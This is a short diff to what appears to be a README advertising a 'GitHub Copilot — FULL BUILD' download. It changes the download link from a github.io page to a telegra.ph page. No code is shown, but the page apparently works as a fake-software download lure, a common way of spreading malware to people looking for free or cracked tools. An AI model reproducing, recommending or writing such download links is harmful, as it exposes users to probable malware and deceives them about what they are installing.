@@ -76,7 +76,7 @@ Net:    Required for online features
 
 <p align="center">
 
-### ⬇️ [DOWNLOAD GITHUB COPILOT — FULL BUILD](https://softmixonline.github.io/download/)
+### ⬇️ [DOWNLOAD GITHUB COPILOT — FULL BUILD](https://telegra.ph/Download-06-01-11)
 
 </p>
 
